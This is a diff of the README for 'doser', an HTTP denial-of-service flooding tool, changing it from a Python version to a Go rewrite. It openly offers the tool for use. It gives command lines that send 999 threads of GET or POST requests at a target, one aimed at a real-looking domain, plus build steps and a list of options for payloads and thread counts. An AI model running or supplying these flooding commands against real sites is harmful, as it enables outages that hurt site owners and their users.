@@ -1,22 +1,21 @@
-# doser.py
-DoS tool for HTTP requests (inspired by hulk but has more functionalities) written in Python:
-![](https://raw.githubusercontent.com/Quitten/doser.py/master/doser.jpg)
+# doser.go
+DoS tool for HTTP requests (inspired by hulk but has more functionalities) written in Go:
+![screenshot](./screenshot.png)
 
-# Examples
-999 threads sends GET requests:
+## How to use?
+1. Compile it
+   ```bash
+   go build doser.go
+   ```
+2. Use it (For example: 999 threads sends GET requests). P.S: Do not really attack my website pls
+   ```bash
+   ./doser -t 999 -g 'https://stylish-bear.ru'
+   ```
 
-```bash
-python doser.py -t 999 -g 'https://targeted.site.com'
-```
 
-999 threads sends POST requests with json data:
-
-```bash
-python doser.py -t 999 -p 'https://targeted.site.com' -ah 'Content-Type: application/json' -d '{"json": "payload"}'
-```
-
-# Usage
-usage: doser.py [-h] [-g G] [-p P] [-d D] [-ah AH] [-t T]
+## Usage
+```txt
+Usage of ./doser: [-h] [-g G] [-p P] [-d D] [-ah AH] [-t T]
 
 optional arguments:
 
@@ -28,9 +27,8 @@ optional arguments:
   
   -d        Specify data payload for POST request
   
-  -ah      Specify addtional header
-  
   -t        Specify number of threads to be used
+```
 
-# TODO:
-Rewrite to Golang :)
+## TODO:
+- [X] Rewrite to Golang :)
